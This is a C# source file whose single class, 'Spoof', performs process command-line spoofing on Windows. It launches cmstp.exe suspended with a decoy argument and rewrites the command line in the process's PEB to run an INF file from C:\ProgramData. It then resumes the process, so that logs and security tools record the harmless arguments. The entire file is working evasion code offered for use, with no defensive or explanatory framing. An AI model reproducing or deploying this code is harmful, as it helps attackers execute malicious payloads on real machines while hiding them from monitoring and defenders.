using System;
using System.Runtime.InteropServices;
using System.Text;

public static class Spoof
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool CreateProcessW(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtQueryInformationProcess(
        IntPtr hProcess,
        int ProcessInformationClass,
        out PROCESS_BASIC_INFORMATION pbi,
        int cb,
        out int returnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        [Out] byte[] lpBuffer,
        int dwSize,
        out int lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int dwSize,
        out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    private const uint CREATE_SUSPENDED = 0x00000004;
    private const int ProcessBasicInformation = 0;

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr ExitStatus;
        public IntPtr PebBaseAddress;
        public IntPtr AffinityMask;
        public IntPtr BasePriority;
        public IntPtr UniqueProcessId;
        public IntPtr InheritedFromUniqueProcessId;
    }

    private const int CommandLineOffset = 0x70;

    public static void Go()
    {
        string spoofedCmd = "cmstp.exe /s C:\\Windows\\System32\\cmstp.inf";
        string realCmd = "cmstp.exe /s C:\\ProgramData\\config.inf";

        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(typeof(STARTUPINFO));

        if (!CreateProcessW(null, spoofedCmd, IntPtr.Zero, IntPtr.Zero, false,
            CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out PROCESS_INFORMATION pi))
        {
            return;
        }

        if (NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation,
            out PROCESS_BASIC_INFORMATION pbi, Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)),
            out int retLen) != 0)
        {
            ResumeThread(pi.hThread);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return;
        }

        byte[] pebBuffer = new byte[IntPtr.Size * 4];
        if (!ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, pebBuffer, pebBuffer.Length, out int bytesRead))
        {
            ResumeThread(pi.hThread);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return;
        }

        int ppOffset = IntPtr.Size == 8 ? 0x20 : 0x10;
        IntPtr processParametersPtr = Marshal.ReadIntPtr(pebBuffer, ppOffset);

        byte[] cmdBuffer = new byte[16];
        if (!ReadProcessMemory(pi.hProcess, IntPtr.Add(processParametersPtr, CommandLineOffset), cmdBuffer, cmdBuffer.Length, out bytesRead))
        {
            ResumeThread(pi.hThread);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return;
        }

        byte[] newCmdBytes = Encoding.Unicode.GetBytes(realCmd);
        IntPtr bufferPtr = Marshal.ReadIntPtr(cmdBuffer, 8);

        if (!WriteProcessMemory(pi.hProcess, bufferPtr, newCmdBytes, newCmdBytes.Length, out int written))
        {
            ResumeThread(pi.hThread);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return;
        }

        byte[] lengthBytes = BitConverter.GetBytes(newCmdBytes.Length);
        byte[] maxLengthBytes = BitConverter.GetBytes(newCmdBytes.Length);
        Buffer.BlockCopy(lengthBytes, 0, cmdBuffer, 0, 2);
        Buffer.BlockCopy(maxLengthBytes, 0, cmdBuffer, 2, 2);
        WriteProcessMemory(pi.hProcess, IntPtr.Add(processParametersPtr, CommandLineOffset), cmdBuffer, cmdBuffer.Length, out written);

        ResumeThread(pi.hThread);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}
